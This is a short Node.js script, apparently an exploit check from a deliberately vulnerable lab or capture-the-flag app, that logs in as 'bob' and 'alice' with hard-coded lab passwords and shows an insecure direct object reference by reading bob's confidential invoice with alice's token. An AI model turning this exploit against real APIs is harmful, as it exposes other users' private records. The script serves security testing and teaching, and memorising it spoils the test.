#!/usr/bin/env node
/** V2.1 IDOR — read bob's invoice memo as alice */
import { extractFlag } from '../../../packages/shared/dist/index.js';

process.on('unhandledRejection', (e) => {
  console.error('FAIL:', e instanceof Error ? e.message : e);
  process.exit(1);
});

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');

async function login(username, password) {
  const res = await fetch(`${base}/api/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
  });
  const body = await res.json();
  if (!res.ok) throw new Error(`login ${username}: ${res.status}`);
  return body.token;
}

const bobToken = await login('bob', 'bob123');
const bobInvoices = await fetch(`${base}/api/invoices`, {
  headers: { Authorization: `Bearer ${bobToken}` },
}).then((r) => r.json());
const victim = bobInvoices.invoices.find((i) => i.title.includes('Confidential'));
if (!victim) {
  console.error('FAIL: victim invoice missing');
  process.exit(1);
}

const aliceToken = await login('alice', 'alice123');
const stolen = await fetch(`${base}/api/invoices/${victim.id}`, {
  headers: { Authorization: `Bearer ${aliceToken}` },
}).then(async (r) => ({ status: r.status, body: await r.text() }));

console.log('status', stolen.status);
const flag = extractFlag(stolen.body);
if (stolen.status !== 200 || !flag) {
  console.error('FAIL: IDOR blocked or no flag');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V2.1 IDOR');
